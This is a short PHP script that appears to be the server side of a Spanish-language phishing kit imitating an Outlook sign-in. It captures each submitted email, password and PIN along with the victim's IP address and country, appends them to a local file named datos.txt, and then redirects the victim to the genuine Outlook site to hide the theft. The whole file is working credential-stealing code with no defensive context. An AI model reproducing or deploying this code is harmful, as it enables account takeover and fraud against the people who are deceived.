<?php 
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];

date_default_timezone_set('UTC');
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

if (isset($_POST['correo']) && isset($_POST['pass']) && isset($_POST['pin'])){
  session_start();
$_SESSION['mail']=$_POST['correo'];
	 
 $file = fopen("datos.txt", "a");
fwrite($file, "correo: ".$_POST['correo']." - pass: ".$_POST['pass']." - pin: ".$_POST['pin']." - pais: ".$pais." - ip: ".$ip."" . PHP_EOL ."*************************************" . PHP_EOL);
fclose($file);
	
echo '<script laguage="javascript">
document.getElementById("contenido1").style.display = "none";
document.getElementById("contenido2").style.display = "inline";
</script>';

Header ("Location: https://outlook.live.com/owa/");
} 
?>